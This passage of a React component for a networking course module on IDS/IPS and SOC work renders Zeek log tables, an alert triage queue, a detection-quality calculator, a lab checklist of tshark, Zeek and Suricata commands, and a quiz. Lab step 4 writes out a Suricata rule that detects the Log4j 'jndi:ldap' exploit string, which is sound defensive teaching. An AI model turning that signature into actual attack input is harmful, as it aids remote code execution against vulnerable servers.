                {/* conn.log */}
                <div className="p-4 bg-[#f6f4ee] rounded-2xl border border-stone-200">
                  <div className="flex items-center justify-between mb-2">
                    <span className="font-mono font-bold text-xs text-stone-900">ZEEK conn.log (Session Records)</span>
                    <span className="text-[10px] text-stone-700 font-mono">{filteredConn.length} entries</span>
                  </div>
                  <div className="overflow-x-auto">
                    <table className="w-full text-[11px] font-mono text-left bg-white rounded-xl border border-stone-200">
                      <thead className="bg-stone-100 text-stone-700">
                        <tr>
                          <th className="p-2">UID</th>
                          <th className="p-2">Time</th>
                          <th className="p-2">Orig &rarr; Resp</th>
                          <th className="p-2">Proto/Service</th>
                          <th className="p-2">Duration</th>
                          <th className="p-2">Bytes (Orig/Resp)</th>
                          <th className="p-2">State</th>
                          <th className="p-2">Analyst Note</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-stone-200">
                        {filteredConn.map((row) => (
                          <tr key={row.uid} className="hover:bg-stone-50">
                            <td className="p-2 font-bold text-[#ea580c]">{row.uid}</td>
                            <td className="p-2">{row.ts}</td>
                            <td className="p-2">{row.orig_h}:{row.orig_p} &rarr; {row.resp_h}:{row.resp_p}</td>
                            <td className="p-2 uppercase">{row.proto}/{row.service}</td>
                            <td className="p-2">{row.duration}s</td>
                            <td className="p-2">{row.orig_bytes} / {row.resp_bytes}</td>
                            <td className="p-2 font-bold text-blue-700">{row.conn_state}</td>
                            <td className="p-2 font-sans text-xs text-stone-700">{row.note}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>

                {/* dns.log & http.log */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-4 bg-[#f6f4ee] rounded-2xl border border-stone-200">
                    <div className="font-mono font-bold text-xs text-stone-900 mb-2">ZEEK dns.log (Naming Telemetry)</div>
                    {filteredDns.length > 0 ? (
                      <div className="space-y-2 text-[11px] font-mono">
                        {filteredDns.map((d, i) => (
                          <div key={i} className="p-2.5 bg-white rounded-xl border border-stone-200 space-y-1">
                            <div><span className="text-stone-700">UID:</span> <span className="font-bold text-[#ea580c]">{d.uid}</span></div>
                            <div><span className="text-stone-700">Query:</span> {d.query} ({d.qtype_name})</div>
                            <div><span className="text-stone-700">Answer:</span> <span className="text-rose-700 font-bold">{d.answers}</span></div>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="p-4 text-center text-xs text-stone-700 font-mono">No matching records in dns.log</div>
                    )}
                  </div>

                  <div className="p-4 bg-[#f6f4ee] rounded-2xl border border-stone-200">
                    <div className="font-mono font-bold text-xs text-stone-900 mb-2">ZEEK http.log (Application Records)</div>
                    {filteredHttp.length > 0 ? (
                      <div className="space-y-2 text-[11px] font-mono">
                        {filteredHttp.map((h, i) => (
                          <div key={i} className="p-2.5 bg-white rounded-xl border border-stone-200 space-y-1">
                            <div><span className="text-stone-700">UID:</span> <span className="font-bold text-[#ea580c]">{h.uid}</span></div>
                            <div><span className="text-stone-700">Request:</span> {h.method} {h.host}{h.uri} &rarr; <span className="text-emerald-700 font-bold">{h.status_code}</span></div>
                            <div className="text-[10px] text-stone-700 truncate"><span className="text-stone-700">Body:</span> {h.request_body_snippet}</div>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="p-4 text-center text-xs text-stone-700 font-mono">No matching records in http.log</div>
                    )}
                  </div>
                </div>
              </div>
            </div>

            {/* SIMULATOR 4: SIEM Alert Triage Queue */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex flex-wrap items-center justify-between gap-3 mb-4 pb-4 border-b border-stone-200">
                <div>
                  <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                    SIMULATOR 4
                  </span>
                  <h3 className="text-xl font-bold text-stone-900 mt-2">
                    SOC Tier 1 SIEM Alert Triage &amp; Incident Escalation Queue
                  </h3>
                </div>
                <button
                  onClick={resetTriageQueue}
                  className="px-3 py-1.5 rounded-xl border border-stone-300 text-xs font-semibold text-stone-700 hover:bg-stone-100 transition cursor-pointer flex items-center gap-1.5"
                >
                  <RefreshCw size={13} />
                  Reset Queue
                </button>
              </div>

              <div className="space-y-4">
                {triageAlerts.map((al) => (
                  <div
                    key={al.id}
                    className={`p-5 rounded-2xl border transition ${
                      al.status === "Resolved"
                        ? "bg-stone-50 border-stone-300 opacity-80"
                        : "bg-[#f6f4ee] border-stone-200"
                    }`}
                  >
                    <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                      <div className="flex items-center gap-2">
                        <span className="font-mono text-xs font-bold text-[#ea580c] bg-orange-50 px-2 py-0.5 rounded border border-orange-200">
                          {al.id}
                        </span>
                        <h4 className="font-bold text-stone-900 text-sm">{al.title}</h4>
                      </div>
                      <span
                        className={`text-[10px] font-bold px-2 py-0.5 rounded ${
                          al.severity === "Critical"
                            ? "bg-rose-100 text-rose-800"
                            : "bg-amber-100 text-amber-800"
                        }`}
                      >
                        {al.severity} Severity
                      </span>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-xs font-mono text-stone-700 my-2">
                      <div><span className="text-stone-700">Source:</span> {al.src}</div>
                      <div><span className="text-stone-700">Destination:</span> {al.dst}</div>
                      <div><span className="text-stone-700">Asset:</span> {al.assetTier}</div>
                    </div>

                    <div className="flex items-center justify-between pt-3 mt-3 border-t border-stone-200">
                      <div className="text-xs text-stone-600">
                        {al.status === "Resolved" ? (
                          <span className="font-bold text-emerald-700 font-mono">
                            Disposition: {al.disposition}
                          </span>
                        ) : (
                          <span>Confidence: {al.confidence}</span>
                        )}
                      </div>

                      {al.status !== "Resolved" && (
                        <div className="flex flex-wrap items-center gap-2">
                          <button
                            onClick={() => handleTriageAction(al.id, "False Positive / Whitelisted")}
                            className="px-2.5 py-1 bg-white hover:bg-stone-100 text-stone-700 text-xs font-bold rounded-lg border border-stone-300 transition cursor-pointer"
                          >
                            Mark Benign
                          </button>
                          <button
                            onClick={() => handleTriageAction(al.id, "Escalated to Tier 2 P1 Incident")}
                            className="px-2.5 py-1 bg-[#ea580c] hover:bg-orange-700 text-white text-xs font-bold rounded-lg transition cursor-pointer"
                          >
                            Escalate Incident
                          </button>
                        </div>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* SIMULATOR 5: Detection Quality & Confusion Matrix Calculator */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex flex-wrap items-center justify-between gap-3 mb-4 pb-4 border-b border-stone-200">
                <div>
                  <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                    SIMULATOR 5
                  </span>
                  <h3 className="text-xl font-bold text-stone-900 mt-2">
                    Detection Quality Engineering &amp; Confusion Matrix Calculator
                  </h3>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
                <div className="space-y-4">
                  <div>
                    <div className="flex justify-between text-xs font-bold text-stone-700 mb-1">
                      <span>Ground Truth Malicious Events:</span>
                      <span className="font-mono text-[#ea580c] font-bold">{maliciousEvents}</span>
                    </div>
                    <input
                      type="range"
                      min={10}
                      max={500}
                      step={10}
                      value={maliciousEvents}
                      onChange={(e) => setMaliciousEvents(Number(e.target.value))}
                      className="w-full accent-orange-600"
                    />
                  </div>

                  <div>
                    <div className="flex justify-between text-xs font-bold text-stone-700 mb-1">
                      <span>Ground Truth Benign Events:</span>
                      <span className="font-mono text-[#ea580c] font-bold">{benignEvents}</span>
                    </div>
                    <input
                      type="range"
                      min={500}
                      max={10000}
                      step={100}
                      value={benignEvents}
                      onChange={(e) => setBenignEvents(Number(e.target.value))}
                      className="w-full accent-orange-600"
                    />
                  </div>

                  <div>
                    <div className="flex justify-between text-xs font-bold text-stone-700 mb-1">
                      <span>Detection Sensitivity Threshold:</span>
                      <span className="font-mono text-purple-700 font-bold">{detectionSensitivity}%</span>
                    </div>
                    <input
                      type="range"
                      min={20}
                      max={99}
                      step={1}
                      value={detectionSensitivity}
                      onChange={(e) => setDetectionSensitivity(Number(e.target.value))}
                      className="w-full accent-purple-600"
                    />
                    <div className="flex justify-between text-[10px] text-stone-700">
                      <span>Conservative (Few FPs)</span>
                      <span>Aggressive (High Recall)</span>
                    </div>
                  </div>
                </div>

                <div className="md:col-span-2 space-y-4">
                  {/* Confusion Matrix Table */}
                  <div className="p-4 bg-[#f6f4ee] rounded-2xl border border-stone-200">
                    <div className="text-xs font-bold text-stone-800 mb-2">2&times;2 CONTINGENCY MATRIX:</div>
                    <div className="grid grid-cols-2 gap-3 text-xs font-mono">
                      <div className="p-3 bg-white rounded-xl border border-emerald-300">
                        <span className="text-[10px] text-emerald-800 block font-bold">TRUE POSITIVES (TP):</span>
                        <span className="text-xl font-extrabold text-emerald-700">{qualityMetrics.tp}</span>
                        <span className="text-[10px] text-stone-700 block mt-0.5">Correctly Detected Attacks</span>
                      </div>
                      <div className="p-3 bg-white rounded-xl border border-rose-300">
                        <span className="text-[10px] text-rose-800 block font-bold">FALSE POSITIVES (FP):</span>
                        <span className="text-xl font-extrabold text-rose-700">{qualityMetrics.fp}</span>
                        <span className="text-[10px] text-stone-700 block mt-0.5">Benign Traffic Flagged as Attacks</span>
                      </div>
                      <div className="p-3 bg-white rounded-xl border border-amber-300">
                        <span className="text-[10px] text-amber-800 block font-bold">FALSE NEGATIVES (FN):</span>
                        <span className="text-xl font-extrabold text-amber-700">{qualityMetrics.fn}</span>
                        <span className="text-[10px] text-stone-700 block mt-0.5">Missed Real Attacks</span>
                      </div>
                      <div className="p-3 bg-white rounded-xl border border-stone-300">
                        <span className="text-[10px] text-stone-700 block font-bold">TRUE NEGATIVES (TN):</span>
                        <span className="text-xl font-extrabold text-stone-700">{qualityMetrics.tn}</span>
                        <span className="text-[10px] text-stone-700 block mt-0.5">Benign Traffic Passed Cleanly</span>
                      </div>
                    </div>
                  </div>

                  {/* Calculated KPI Badges */}
                  <div className="grid grid-cols-4 gap-2 text-center text-xs font-mono">
                    <div className="p-3 bg-white rounded-xl border border-stone-200">
                      <span className="text-[10px] text-stone-700 block">PRECISION</span>
                      <span className="text-base font-bold text-[#ea580c]">{qualityMetrics.precision}%</span>
                    </div>
                    <div className="p-3 bg-white rounded-xl border border-stone-200">
                      <span className="text-[10px] text-stone-700 block">RECALL</span>
                      <span className="text-base font-bold text-blue-700">{qualityMetrics.recall}%</span>
                    </div>
                    <div className="p-3 bg-white rounded-xl border border-stone-200">
                      <span className="text-[10px] text-stone-700 block">FALSE POS. RATE</span>
                      <span className="text-base font-bold text-rose-700">{qualityMetrics.fpr}%</span>
                    </div>
                    <div className="p-3 bg-white rounded-xl border border-stone-200">
                      <span className="text-[10px] text-stone-700 block">F1-SCORE</span>
                      <span className="text-base font-bold text-purple-700">{qualityMetrics.f1}%</span>
                    </div>
                  </div>

                  {/* Operational Fatigue Status */}
                  <div className="p-3 bg-white rounded-xl border border-stone-200 text-xs flex items-center justify-between">
                    <div>
                      <span className="text-[10px] font-mono text-stone-700 block">ANALYST BURDEN:</span>
                      <span className="font-semibold text-stone-900">{qualityMetrics.dailyAlertVolume} Alerts Generated</span>
                    </div>
                    <span
                      className={`px-3 py-1 rounded-full text-xs font-bold ${
                        qualityMetrics.fatigueColor === "emerald"
                          ? "bg-emerald-100 text-emerald-800"
                          : qualityMetrics.fatigueColor === "amber"
                          ? "bg-amber-100 text-amber-800"
                          : "bg-rose-100 text-rose-800"
                      }`}
                    >
                      {qualityMetrics.fatigueStatus}
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* TAB 3: HANDS-ON LAB 20.1 */}
        {activeTab === "lab" && (
          <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm space-y-8">
            <div className="flex flex-wrap items-center justify-between gap-4 pb-4 border-b border-stone-200">
              <div>
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  LAB 20.1
                </span>
                <h2 className="text-2xl font-bold text-stone-900 mt-2">
                  IDS/IPS Detection Engineering &amp; SOC Investigation Lab
                </h2>
                <p className="text-stone-700 text-xs mt-1">
                  Complete the 9-point operational checklist to validate Suricata detection rules, Zeek correlation, and incident triage.
                </p>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-xs font-mono font-bold text-stone-700">
                  Progress: {Object.values(checkedItems).filter(Boolean).length} / 9 Completed
                </span>
                <button
                  onClick={() => setCheckedItems({})}
                  className="px-3 py-1.5 rounded-xl border border-stone-300 text-xs font-semibold text-stone-700 hover:bg-stone-100 transition cursor-pointer"
                >
                  Reset Checklist
                </button>
              </div>
            </div>

            <div className="space-y-4">
              {[
                {
                  id: 1,
                  title: "1. Establish Baseline Profile from Benign PCAP in Wireshark",
                  cmd: "tshark -r benign-baseline.pcap -q -z conv,ip",
                  desc: "Document communicating endpoints, normal web ports (80/443), and expected query volume.",
                },
                {
                  id: 2,
                  title: "2. Process Offline Capture with Zeek Telemetry Engine",
                  cmd: "mkdir zeek-logs && cd zeek-logs && zeek -r ../suspicious-activity.pcap",
                  desc: "Generate structured conn.log, dns.log, and http.log records from packet capture.",
                },
                {
                  id: 3,
                  title: "3. Run Suricata in Offline Inspection Mode against PCAP",
                  cmd: "suricata -r suspicious-activity.pcap -c /etc/suricata/suricata.yaml -l ./suricata-output",
                  desc: "Execute rule inspection pipeline and verify generation of structured eve.json events.",
                },
                {
                  id: 4,
                  title: "4. Author Custom Detection Rule for Suspicious Pattern",
                  cmd: 'echo \'alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"LOCAL Log4j RCE Attempt"; flow:to_server,established; content:"jndi:ldap"; nocase; sid:1000021; rev:1;)\' >> /etc/suricata/rules/local.rules',
                  desc: "Create local rule with unique SID, revision tracking, and established flow modifier.",
                },
                {
                  id: 5,
                  title: "5. Validate Suricata Rule Syntax and Engine Configuration",
                  cmd: "suricata -T -c /etc/suricata/suricata.yaml",
                  desc: "Verify that all custom rules and keywords parse with zero syntax errors before testing.",
                },
                {
                  id: 6,
                  title: "6. Extract Connection Flow Records with zeek-cut",
                  cmd: "zeek-cut ts id.orig_h id.resp_h id.resp_p proto duration conn_state < conn.log | grep 'SF'",
                  desc: "Isolate established sessions and observe connection state indicators.",
                },
                {
                  id: 7,
                  title: "7. Cross-Correlate Suricata Alert with Zeek UID and DNS",
                  cmd: "grep '1000021' suricata-output/eve.json | jq '.src_ip, .dest_ip, .timestamp'",
                  desc: "Match alert timestamps with corresponding queries in dns.log and sessions in conn.log.",
                },
                {
                  id: 8,
                  title: "8. Construct SOC Triage Matrix for Benign vs Malicious Events",
                  cmd: "# Document disposition: Close Benign, Suppress Noisy Rule, or Escalate P1 Incident.",
                  desc: "Apply asset criticality (Tier 1 vs Tier 3) and evaluate confidence vs severity.",
                },
                {
                  id: 9,
                  title: "9. Calculate Precision, Recall, and False-Positive Rate",
                  cmd: "# Compute Precision = TP/(TP+FP) and Recall = TP/(TP+FN) against ground truth test set.",
                  desc: "Verify detection accuracy and document tuning adjustments to minimize analyst fatigue.",
                },
              ].map((item) => (
                <div
                  key={item.id}
                  onClick={() => toggleCheck(item.id)}
                  className={`p-4 rounded-2xl border transition cursor-pointer flex items-start gap-4 ${
                    checkedItems[item.id]
                      ? "bg-emerald-50/50 border-emerald-300"
                      : "bg-[#f6f4ee] border-stone-200 hover:border-stone-300"
                  }`}
                >
                  <div className="pt-0.5">
                    {checkedItems[item.id] ? (
                      <CheckCircle2 className="text-emerald-600" size={20} />
                    ) : (
                      <div className="w-5 h-5 rounded-md border-2 border-stone-400" />
                    )}
                  </div>
                  <div className="flex-1">
                    <h4 className="text-sm font-bold text-stone-900">{item.title}</h4>
                    <p className="text-xs text-stone-600 my-1">{item.desc}</p>
                    <div className="relative mt-2">
                      <pre className="p-3 bg-stone-950 text-stone-200 rounded-xl font-mono text-[11px] overflow-x-auto whitespace-pre-wrap">
                        {item.cmd}
                      </pre>
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleCopy(item.cmd, `lab-${item.id}`);
                        }}
                        className="absolute top-2 right-2 p-1.5 rounded-lg bg-stone-800 text-stone-300 hover:text-white transition cursor-pointer"
                        title="Copy command"
                      >
                        {copiedKey === `lab-${item.id}` ? <Check size={13} className="text-emerald-400" /> : <Copy size={13} />}
                      </button>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* TAB 4: KNOWLEDGE CHECK (10 Questions) */}
        {activeTab === "quiz" && (
          <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm space-y-8">
            <div className="flex flex-wrap items-center justify-between gap-4 pb-4 border-b border-stone-200">
              <div>
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  ASSESSMENT
                </span>
                <h2 className="text-2xl font-bold text-stone-900 mt-2">
                  Module 20 Technical Knowledge Check
                </h2>
                <p className="text-stone-700 text-xs mt-1">
                  10 comprehensive questions on IDS/IPS architecture, Suricata/Snort 3 rules, Zeek correlation, and SOC triage.
                </p>
              </div>

              {quizSubmitted ? (
                <div className="flex items-center gap-3">
                  <div className="text-right">
                    <div className="text-xs text-stone-700">Final Score</div>
                    <div className="text-lg font-bold font-mono text-[#ea580c]">
                      {calculateScore()} / {quizQuestions.length} ({Math.round((calculateScore() / quizQuestions.length) * 100)}%)
                    </div>
                  </div>
                  <button
                    onClick={resetQuiz}
                    className="px-4 py-2 rounded-xl bg-stone-900 text-white text-xs font-bold hover:bg-[#ea580c] transition cursor-pointer"
                  >
                    Retake Quiz
                  </button>
                </div>
              ) : (
                <button
                  onClick={() => setQuizSubmitted(true)}
                  disabled={Object.keys(quizAnswers).length < quizQuestions.length}
                  className={`px-5 py-2.5 rounded-xl text-xs font-bold transition ${
                    Object.keys(quizAnswers).length === quizQuestions.length
                      ? "bg-[#ea580c] text-white hover:bg-orange-700 cursor-pointer"
                      : "bg-stone-200 text-stone-700 cursor-not-allowed"
                  }`}
                >
                  Submit Answers ({Object.keys(quizAnswers).length}/{quizQuestions.length})
                </button>
              )}
            </div>

            <div className="space-y-6">
              {quizQuestions.map((q, idx) => (
                <div key={q.id} className="p-5 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <div className="flex items-start gap-3 mb-3">
                    <span className="w-6 h-6 rounded-lg bg-stone-900 text-white text-xs font-mono font-bold flex items-center justify-center shrink-0">
                      {idx + 1}
                    </span>
                    <h4 className="text-sm font-bold text-stone-900 leading-snug">{q.question}</h4>
                  </div>

                  <div className="space-y-2 mt-3 pl-9">
                    {q.options.map((opt, optIdx) => {
                      const isSelected = quizAnswers[q.id] === optIdx;
                      const isCorrect = q.correct === optIdx;
                      let btnStyle = "bg-white border-stone-200 text-stone-800 hover:border-stone-400";

                      if (quizSubmitted) {
                        if (isCorrect) {
                          btnStyle = "bg-emerald-100 border-emerald-400 text-emerald-950 font-bold";
                        } else if (isSelected && !isCorrect) {
                          btnStyle = "bg-rose-100 border-rose-400 text-rose-950 font-medium";
                        } else {
                          btnStyle = "bg-white/50 border-stone-200 text-stone-700 opacity-60";
                        }
                      } else if (isSelected) {
                        btnStyle = "bg-orange-50 border-[#ea580c] text-[#ea580c] font-bold";
                      }

                      return (
                        <button
                          key={optIdx}
                          disabled={quizSubmitted}
                          onClick={() => handleQuizSelect(q.id, optIdx)}
                          className={`w-full text-left p-3 rounded-xl border text-xs transition cursor-pointer flex items-center justify-between ${btnStyle}`}
                        >
                          <span>{opt}</span>
                          {quizSubmitted && isCorrect && <CheckCircle2 size={15} className="text-emerald-700 shrink-0 ml-2" />}
                        </button>
                      );
                    })}
                  </div>

                  {quizSubmitted && (
                    <div className="mt-3 pl-9 text-xs text-stone-600 bg-stone-100 p-3 rounded-xl border border-stone-200">
                      <span className="font-bold text-stone-800 block mb-0.5">Rationale:</span>
                      {q.explanation}
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        )}

        {/* TAB 5: SRE INCIDENT REPORT DELIVERABLE */}
        {activeTab === "audit" && (
          <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm space-y-6">
            <div className="flex flex-wrap items-center justify-between gap-4 pb-4 border-b border-stone-200">
              <div>
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  DELIVERABLE TEMPLATE
                </span>
                <h2 className="text-2xl font-bold text-stone-900 mt-2">
                  SOC Incident Assessment &amp; Detection Engineering Report
                </h2>
                <p className="text-stone-700 text-xs mt-1">
                  Ready-to-use Markdown post-incident review deliverable for SOC engineering and detection audits.
                </p>
              </div>

              <button
                onClick={() => handleCopy(socIncidentReport, "soc-report")}
                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-stone-900 text-white text-xs font-bold hover:bg-[#ea580c] transition cursor-pointer shadow-sm"
              >
                {copiedKey === "soc-report" ? (
                  <>
                    <Check size={14} className="text-emerald-400" />
                    <span>Copied Markdown!</span>
                  </>
                ) : (
                  <>
                    <Copy size={14} />
                    <span>Copy Full Report Template</span>
                  </>
                )}
              </button>
            </div>

            <div className="bg-stone-950 rounded-2xl p-5 border border-stone-800 font-mono text-[11px] text-stone-300 max-h-96 overflow-y-auto leading-relaxed whitespace-pre-wrap">
              {socIncidentReport}
            </div>
          </div>
        )}

        {/* Footer Navigation Bar */}
        <div className="mt-10 pt-6 border-t border-[#e7e3da] flex flex-wrap items-center justify-between gap-4">
          <button
            onClick={() => {
              navigate("/learning/networks/attacks-defenses");
              window.scrollTo({ top: 0, behavior: "smooth" });
            }}
            className="flex items-center gap-2 px-4 py-2 rounded-xl border border-[#e7e3da] bg-white text-xs font-bold text-stone-700 hover:border-orange-300 hover:text-[#ea580c] transition cursor-pointer"
          >
            <ArrowLeft size={16} />
            <span>Previous: Module 19 — Attacks &amp; Countermeasures</span>
          </button>

          <button
            onClick={() => {
              navigate("/learning/networks/network-automation");
              window.scrollTo({ top: 0, behavior: "smooth" });
            }}
            className="flex items-center gap-2 px-4 py-2 rounded-xl bg-stone-900 text-xs font-bold text-white hover:bg-[#ea580c] transition cursor-pointer"
          >
            <span>Next: Module 21 — Network Programming &amp; Automation</span>
            <ArrowRight size={16} />
          </button>
        </div>
      </div>
    </div>
  );
}
